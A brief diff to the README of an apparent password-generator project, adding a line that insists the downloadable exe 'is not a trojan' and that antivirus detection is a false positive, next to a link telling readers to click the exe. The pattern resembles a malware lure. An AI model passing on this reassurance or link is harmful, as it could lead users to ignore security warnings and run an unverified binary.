@@ -4,6 +4,9 @@ Just go to releases and wait for 15-20 seconds to generate password
 Easy as that
 
 
+
+IT IS NOT A TROJAN ITS A FALSE POSITIVE SAD AS IT EXECUTES PYTHON SCRIPT 
+
 To install ----- https://github.com/Nonerz/password-creator/releases/tag/Security and click on the exe
 
 |
